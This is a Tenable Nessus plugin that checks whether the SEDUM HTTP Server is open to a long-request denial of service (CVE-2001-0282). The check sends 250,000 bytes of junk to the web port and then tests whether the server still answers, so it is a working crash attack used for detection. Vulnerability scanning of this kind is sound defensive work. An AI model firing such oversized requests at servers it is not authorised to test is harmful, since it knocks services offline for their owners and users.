#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10637);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2001-0282");
 script_bugtraq_id(2413);
 script_xref(name:"OSVDB", value:"11637");
 
 script_name(english:"SEDUM HTTP Server Long HTTP Request Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote web server crash by sending it too 
much data.

An attacker may use this flaw to prevent this host from fulfilling its
role." );
 script_set_attribute(attribute:"solution", value:
"Contact your vendor for a patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english: "Crashes the remote web server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("global_settings.inc");
include("http_func.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 { 
  req = crap(250000);
  send(socket:soc, data:req);
  close(soc);
  sleep(2);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_warning(port);
 }
}
